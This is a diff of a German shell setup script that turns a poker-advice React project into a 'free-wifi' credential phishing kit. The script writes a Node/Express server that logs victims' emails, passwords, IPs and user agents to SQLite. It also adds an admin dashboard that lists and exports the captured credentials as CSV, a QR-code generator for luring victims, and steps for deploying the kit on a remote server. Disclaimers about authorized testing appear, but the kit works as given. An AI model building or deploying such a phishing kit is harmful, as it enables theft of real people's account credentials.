-      </button>
-
-      {result && (
-        <div className="result-container">
-          <h2 className="result-title">Empfehlung:</h2>
-          <div className={`decision ${result.decision}`}>
-            {result.decision.toUpperCase()}
-          </div>
-          <div className="explanation">{result.explanation}</div>
-          <div className="confidence-bar">
-            <div
-              className={`confidence-level ${
-                result.confidence > 70 ? 'high' :
-                result.confidence > 50 ? 'medium' : 'low'
-              }`}
-              style={{width: `${result.confidence}%`}}
-            ></div>
-          </div>
-          <div className="confidence-text">Konfidenz: {result.confidence}%</div>
-        </div>
-      )}
-    </div>
-  );
-};
-
-export default PokerAdvisor;
-EOF
-
-# index.js erstellen
-echo "Erstelle index.js..."
-cat > src/index.js << 'EOF'
+# Erstelle index.js
+echo "📄 Erstelle index.js..."
+cat > src/index.js << 'EOL'
 import React from 'react';
 import ReactDOM from 'react-dom/client';
 import './index.css';
@@ -807,45 +443,567 @@ root.render(
     <App />
   </React.StrictMode>
 );
-EOF
+EOL
 
-echo "Erstelle README.md..."
-cat > README.md << 'EOF'
-# Poker Hand Advisor
+# Erstelle index.css
+echo "📄 Erstelle index.css..."
+cat > src/index.css << 'EOL'
+body {
+  margin: 0;
+  font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Oxygen',
+    'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
+    sans-serif;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  background-color: #f1f1f1;
+}
 
-Eine React-App zur Bewertung von Poker-Händen. Die App bietet Empfehlungen für Spielentscheidungen basierend auf deinen Karten, der Position am Tisch und dem Spielfortschritt.
+code {
+  font-family: source-code-pro, Menlo, Monaco, Consolas, 'Courier New',
+    monospace;
+}
+EOL
 
-## Features
+# Erstelle package.json
+echo "📄 Aktualisiere package.json..."
+cat > package.json << 'EOL'
+{
+  "name": "free-wifi",
+  "version": "0.1.0",
+  "private": true,
+  "dependencies": {
+    "@testing-library/jest-dom": "^5.16.5",
+    "@testing-library/react": "^13.4.0",
+    "@testing-library/user-event": "^13.5.0",
+    "body-parser": "^1.20.2",
+    "cors": "^2.8.5",
+    "express": "^4.18.2",
+    "react": "^18.2.0",
+    "react-dom": "^18.2.0",
+    "react-scripts": "5.0.1",
+    "sqlite3": "^5.1.7",
+    "web-vitals": "^2.1.4"
+  },
+  "scripts": {
+    "start": "react-scripts start",
+    "build": "react-scripts build",
+    "test": "react-scripts test",
+    "eject": "react-scripts eject",
+    "deploy": "npm run build && echo 'Build abgeschlossen. Die Dateien befinden sich im Ordner \"build\"'",
+    "server": "node server.js",
+    "start-all": "npm run build && npm run server"
+  },
+  "eslintConfig": {
+    "extends": [
+      "react-app",
+      "react-app/jest"
+    ]
+  },
+  "browserslist": {
+    "production": [
+      ">0.2%",
+      "not dead",
+      "not op_mini all"
+    ],
+    "development": [
+      "last 1 chrome version",
+      "last 1 firefox version",
+      "last 1 safari version"
+    ]
+  },
+  "proxy": "http://localhost:6666"
+}
+EOL
 
-- Pre-Flop Handanalyse
-- Flop Handanalyse (nach dem Austeilen der drei Gemeinschaftskarten)
-- Positionsbasierte Empfehlungen
-- Bewertung von Draw-Potential
-- Dunkles Theme-Design mit dem Farbschema #2C2E3B
+# Erstelle ein Skript zum Generieren des QR-Codes
+echo "📄 Erstelle QR-Code Generator Skript..."
+cat > generate-qr.js << 'EOL'
+const fs = require('fs');
+const qrcode = require('qrcode');
 
-## Starten der App
+// Die URL, für die ein QR-Code generiert werden soll
+const url = process.argv[2] || 'http://localhost:3000';
 
-```bash
-npm start
-```
+// Generiere QR-Code
+qrcode.toFile(
+  'wifi-qr.png',
+  url,
+  {
+    color: {
+      dark: '#2C2E3B',
+      light: '#FFFFFF'
+    },
+    width: 300,
+    margin: 1
+  },
+  function(err) {
+    if (err) {
+      console.error('Fehler beim Erstellen des QR-Codes:', err);
+      return;
+    }
+    console.log('✅ QR-Code wurde erstellt: wifi-qr.png');
+    console.log(`Der QR-Code führt zu: ${url}`);
+  }
+);
+EOL
 
-Besuche [http://localhost:3000](http://localhost:3000) im Browser, um die App zu nutzen.
+# Erstelle Admin-Dashboard
+echo "📄 Erstelle Admin-Dashboard..."
+mkdir -p public/admin
+cat > public/admin/index.html << 'EOL'
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Gesammelte Credentials</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
 
-## Technologien
+        body {
+            background-color: #f1f1f1;
+            color: #333;
+            padding: 20px;
+        }
 
-- React
-- Reines CSS (ohne externe UI-Bibliotheken/Frameworks)
-EOF
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
 
-echo "Installiere Abhängigkeiten..."
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 20px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        h1 {
+            color: #2C2E3B;
+            font-size: 24px;
+        }
+
+        .toolbar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            background-color: #2C2E3B;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        button:hover {
+            background-color: #1e2030;
+        }
+
+        .export-btn {
+            background-color: #34A853;
+        }
+
+        .export-btn:hover {
+            background-color: #2d9249;
+        }
+
+        .delete-btn {
+            background-color: #EA4335;
+        }
+
+        .delete-btn:hover {
+            background-color: #d33426;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+        }
+
+        th {
+            background-color: #f9f9f9;
+            font-weight: 500;
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        tr:hover {
+            background-color: #f7f9fc;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .badge-google {
+            background-color: #f1f3f4;
+            color: #4285F4;
+        }
+
+        .badge-email {
+            background-color: #e8f0fe;
+            color: #1a73e8;
+        }
+
+        .status {
+            margin: 15px 0;
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .no-records {
+            padding: 40px;
+            text-align: center;
+            color: #5f6368;
+            font-style: italic;
+        }
+
+        .timestamp {
+            font-size: 12px;
+            color: #70757a;
+        }
+
+        footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+            padding-top: 10px;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Admin Dashboard - Gesammelte Credentials</h1>
+            <p id="total-count" class="status">Lade Daten...</p>
+        </header>
+
+        <div class="toolbar">
+            <button id="refresh-btn">Aktualisieren</button>
+            <button id="export-btn" class="export-btn">Exportieren (CSV)</button>
+            <button id="delete-all-btn" class="delete-btn">Alle löschen</button>
+        </div>
+
+        <div id="records-container">
+            <table id="credentials-table">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Typ</th>
+                        <th>E-Mail</th>
+                        <th>Passwort</th>
+                        <th>IP-Adresse</th>
+                        <th>User-Agent</th>
+                        <th>Zeitstempel</th>
+                    </tr>
+                </thead>
+                <tbody id="table-body">
+                    <!-- Tabellendaten werden hier eingefügt -->
+                </tbody>
+            </table>
+            <div id="no-records" class="no-records" style="display: none;">
+                Keine Datensätze gefunden.
+            </div>
+        </div>
+
+        <footer>
+            <p>Sicherheitsforschung - Nur zu Bildungszwecken und autorisierten Tests</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const tableBody = document.getElementById('table-body');
+            const totalCount = document.getElementById('total-count');
+            const noRecords = document.getElementById('no-records');
+            const refreshBtn = document.getElementById('refresh-btn');
+            const exportBtn = document.getElementById('export-btn');
+            const deleteAllBtn = document.getElementById('delete-all-btn');
+
+            // Daten laden
+            function loadCredentials() {
+                fetch('/api/admin/credentials')
+                    .then(response => response.json())
+                    .then(data => {
+                        tableBody.innerHTML = '';
+
+                        if (data.length === 0) {
+                            noRecords.style.display = 'block';
+                            document.getElementById('credentials-table').style.display = 'none';
+                            totalCount.textContent = 'Keine Datensätze vorhanden';
+                        } else {
+                            noRecords.style.display = 'none';
+                            document.getElementById('credentials-table').style.display = 'table';
+                            totalCount.textContent = `${data.length} Datensätze gefunden`;
+
+                            data.forEach(record => {
+                                const row = document.createElement('tr');
+
+                                const typeClass = record.type === 'google' ? 'badge-google' : 'badge-email';
+                                const typeText = record.type === 'google' ? 'Google' : 'E-Mail';
+
+                                row.innerHTML = `
+                                    <td>${record.id}</td>
+                                    <td><span class="badge ${typeClass}">${typeText}</span></td>
+                                    <td>${escapeHtml(record.email)}</td>
+                                    <td>${escapeHtml(record.password)}</td>
+                                    <td>${escapeHtml(record.ipAddress || '-')}</td>
+                                    <td title="${escapeHtml(record.userAgent || '')}">${escapeHtml(record.userAgent ? record.userAgent.substring(0, 30) + '...' : '-')}</td>
+                                    <td class="timestamp">${new Date(record.timestamp).toLocaleString()}</td>
+                                `;
+
+                                tableBody.appendChild(row);
+                            });
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        totalCount.textContent = 'Fehler beim Laden der Daten';
+                    });
+            }
+
+            // Sicherheitsmaßnahme: HTML-Escaping
+            function escapeHtml(text) {
+                if (!text) return '';
+                const div = document.createElement('div');
+                div.textContent = text;
+                return div.innerHTML;
+            }
+
+            // CSV-Export
+            function exportToCsv() {
+                fetch('/api/admin/credentials')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.length === 0) {
+                            alert('Keine Daten zum Exportieren vorhanden.');
+                            return;
+                        }
+
+                        // CSV-Header
+                        let csvContent = 'ID,Typ,E-Mail,Passwort,IP-Adresse,User-Agent,Zeitstempel\n';
+
+                        // CSV-Daten
+                        data.forEach(record => {
+                            const row = [
+                                record.id,
+                                record.type,
+                                record.email,
+                                record.password,
+                                record.ipAddress || '',
+                                record.userAgent || '',
+                                record.timestamp
+                            ].map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',');
+
+                            csvContent += row + '\n';
+                        });
+
+                        // Download-Link erstellen
+                        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+                        const url = URL.createObjectURL(blob);
+                        const link = document.createElement('a');
+                        link.setAttribute('href', url);
+                        link.setAttribute('download', `credentials_${new Date().toISOString().slice(0, 10)}.csv`);
+                        link.style.visibility = 'hidden';
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('Fehler beim Exportieren der Daten');
+                    });
+            }
+
+            // Alle Datensätze löschen (erfordert entsprechenden Server-Endpunkt)
+            function deleteAllRecords() {
+                if (confirm('Bist du sicher, dass du alle Datensätze löschen möchtest? Diese Aktion kann nicht rückgängig gemacht werden.')) {
+                    alert('Hinweis: Diese Funktion muss auf dem Server implementiert werden. Für diese Demo wird nur die Tabelle geleert.');
+                    tableBody.innerHTML = '';
+                    noRecords.style.display = 'block';
+                    document.getElementById('credentials-table').style.display = 'none';
+                    totalCount.textContent = 'Keine Datensätze vorhanden';
+                }
+            }
+
+            // Event-Handler
+            refreshBtn.addEventListener('click', loadCredentials);
+            exportBtn.addEventListener('click', exportToCsv);
+            deleteAllBtn.addEventListener('click', deleteAllRecords);
+
+            // Initial Daten laden
+            loadCredentials();
+        });
+    </script>
+</body>
+</html>
+EOL
+
+# Installiere Abhängigkeiten
+echo "📦 Installiere Abhängigkeiten..."
 npm install
+npm install --save-dev qrcode
+npm install express body-parser cors sqlite3
+
+# Erstelle server.js
+echo "📄 Erstelle server.js für Credential-Speicherung..."
+cat > server.js << 'EOL'
+// server.js - Backend-Server zum Empfangen und Speichern von Credentials
+const express = require('express');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+const sqlite3 = require('sqlite3').verbose();
+const path = require('path');
+const fs = require('fs');
+
+// Server-Konfiguration
+const app = express();
+const PORT = 6666;
+
+// Middleware
+app.use(cors());
+app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, 'build')));
+
+// Datenbank-Einrichtung
+const dbDir = path.join(__dirname, 'data');
+if (!fs.existsSync(dbDir)) {
+  fs.mkdirSync(dbDir);
+}
+
+const db = new sqlite3.Database(path.join(dbDir, 'credentials.db'));
+
+// Datenbank-Tabelle erstellen
+db.serialize(() => {
+  db.run(`
+    CREATE TABLE IF NOT EXISTS credentials (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      type TEXT NOT NULL,
+      email TEXT NOT NULL,
+      password TEXT NOT NULL,
+      ipAddress TEXT,
+      userAgent TEXT,
+      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+  `);
+});
+
+// Endpoint zum Empfangen von Credentials
+app.post('/api/log', (req, res) => {
+  const { type, email, password } = req.body;
+  const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const userAgent = req.headers['user-agent'];
+
+  if (!type || !email || !password) {
+    return res.status(400).json({ error: 'Unvollständige Daten' });
+  }
+
+  const stmt = db.prepare(`
+    INSERT INTO credentials (type, email, password, ipAddress, userAgent)
+    VALUES (?, ?, ?, ?, ?)
+  `);
+
+  stmt.run(type, email, password, ipAddress, userAgent, (err) => {
+    if (err) {
+      console.error('Fehler beim Speichern der Credentials:', err);
+      return res.status(500).json({ error: 'Datenbankfehler' });
+    }
+
+    console.log(`Neue ${type} Credentials gespeichert: ${email}`);
+    res.status(200).json({ status: 'success' });
+  });
+
+  stmt.finalize();
+});
+
+// Endpoint zum Anzeigen aller gesammelten Credentials (nur für Administratoren)
+app.get('/api/admin/credentials', (req, res) => {
+  // Hier könnte eine Admin-Authentifizierung stattfinden
+
+  db.all('SELECT * FROM credentials ORDER BY timestamp DESC', (err, rows) => {
+    if (err) {
+      console.error('Fehler beim Abrufen der Credentials:', err);
+      return res.status(500).json({ error: 'Datenbankfehler' });
+    }
+
+    res.status(200).json(rows);
+  });
+});
+
+// Serviere React-App für alle anderen Routen
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'build', 'index.html'));
+});
+
+// Server starten
+app.listen(PORT, () => {
+  console.log(`Server läuft auf Port ${PORT}`);
+  console.log(`Phishing-Endpunkt: http://localhost:${PORT}/api/log`);
+  console.log(`Admin-Übersicht: http://localhost:${PORT}/api/admin/credentials`);
+});
+EOL
+
+# Kompiliere die App
+echo "🔨 Baue die React-App..."
+npm run build
+
+# Erstelle den QR-Code für den Server
+echo "🔄 Erstelle QR-Code für Server auf Port 6666..."
+node generate-qr.js http://localhost:6666
 
 echo ""
-echo "=== Setup abgeschlossen ==="
-echo "Die Poker App wurde erfolgreich erstellt!"
+echo "✅ Free-WiFi Phishing-Testumgebung mit Datenbank-Backend wurde erfolgreich erstellt!"
 echo ""
-echo "Um die App zu starten, führe folgende Befehle aus:"
-echo "cd poker-advisor"
-echo "npm start"
+echo "Anleitung zum Starten der App mit Datenbank-Backend:"
+echo "1. Navigiere in den Ordner 'free-wifi'"
+echo "2. Führe 'npm run server' aus, um den Server auf Port 6666 zu starten"
+echo "3. Die App ist dann unter http://localhost:6666 verfügbar"
+echo "4. Credentials werden in der SQLite-Datenbank 'data/credentials.db' gespeichert"
+echo "5. Admin-Übersicht der gesammelten Daten: http://localhost:6666/api/admin/credentials"
 echo ""
-echo "Die App ist dann unter http://localhost:3000 verfügbar."
+echo "Für die Bereitstellung auf einem Remote-Server:"
+echo "1. Führe 'npm run build' aus, um eine optimierte Version zu erstellen"
+echo "2. Kopiere die server.js, package.json und den gesamten build-Ordner auf deinen Server"
+echo "3. Führe 'npm install' und dann 'npm run server' auf dem Server aus"
+echo ""
+echo "Für eine produktionsreife Einrichtung:"
+echo "1. Passe die IP- und Port-Einstellungen in server.js an"
+echo "2. Erstelle einen neuen QR-Code mit deiner tatsächlichen Server-URL:"
+echo "   node generate-qr.js https://deine-server-url.com:6666"
+echo ""
+echo "QR-Code wurde erstellt und im Projektordner gespeichert (wifi-qr.png)"
+echo ""
+echo "⚠️ WICHTIG: Diese Anwendung darf nur für autorisierte Sicherheitstests verwendet werden! ⚠️"
+
+cd ..
+
+chmod +x free-wifi/setup-free-wifi.sh
+
+echo "Das Skript kann jetzt mit './free-wifi/setup-free-wifi.sh' ausgeführt werden."
